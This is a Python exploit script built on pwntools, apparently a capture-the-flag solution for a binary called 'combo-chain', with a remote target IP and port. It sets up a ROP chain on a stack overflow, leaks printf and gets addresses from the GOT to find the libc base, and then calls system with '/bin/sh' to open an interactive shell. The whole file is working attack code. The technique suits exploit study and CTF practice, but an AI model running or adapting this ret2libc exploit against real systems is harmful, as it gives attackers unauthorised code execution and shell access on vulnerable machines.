#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template combo-chain
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('combo-chain')
context.terminal = ['gnome-terminal', '-e']

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote("131.114.59.19", 8197, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

rip_offset = 16
addr_size = 8

exe_segment = 0x400000
got_plt = exe_segment + 0x4000
printf_got_plt = got_plt + 0x28
gets_got_plt = got_plt + 0x30

pop_rdi_addr = 0x0000000000401263
pop_rsi_pop_r15_addr = 0x0000000000401261
printf_addr = 0x0000000000401050
main_addr = 0x00000000004011a4

payload0 = dict()

payload0[rip_offset + 0*addr_size] = pop_rdi_addr
payload0[rip_offset + 1*addr_size] = p64(printf_got_plt)
payload0[rip_offset + 2*addr_size] = pop_rsi_pop_r15_addr
payload0[rip_offset + 3*addr_size] = p64(0)
payload0[rip_offset + 5*addr_size] = printf_addr
payload0[rip_offset + 6*addr_size] = pop_rdi_addr
payload0[rip_offset + 7*addr_size] = p64(gets_got_plt)
payload0[rip_offset + 8*addr_size] = pop_rsi_pop_r15_addr
payload0[rip_offset + 9*addr_size] = p64(0)
payload0[rip_offset + 11*addr_size] = printf_addr
payload0[rip_offset + 12*addr_size] = main_addr

payload0 = fit(payload0)

io = start()

io.recvuntil("COMBO CARNAGE!: ")
io.sendline(payload0)

libc_printf = u64(io.recvuntil("\x7f").ljust(8, b"\x00"))
libc_gets = u64(io.recvuntil("Dude", drop=True).ljust(8, b"\x00"))
log.info("printf address: %x" % (libc_printf))
log.info("gets address: %x" % (libc_gets))


#libc_segment = libc_printf - 0x57220 #Mio
libc_segment = libc_printf - 0x054340 #Server

#libc_binsh = libc_segment + 0x18b143 #Mio
libc_binsh = libc_segment + 0x180543 #Server
#libc_system = libc_segment + 0x49100 #Mio
libc_system = libc_segment + 0x046590 #Server

log.info("libc address: %x" % (libc_segment))

payload2 = dict()

payload2[rip_offset]      = p64(pop_rdi_addr)
payload2[rip_offset + 8]  = p64(libc_binsh)
payload2[rip_offset + 16] = p64(libc_system)

payload2 = fit(payload2)

io.recvuntil("COMBO CARNAGE!: ")
io.sendline(payload2)

io.interactive()

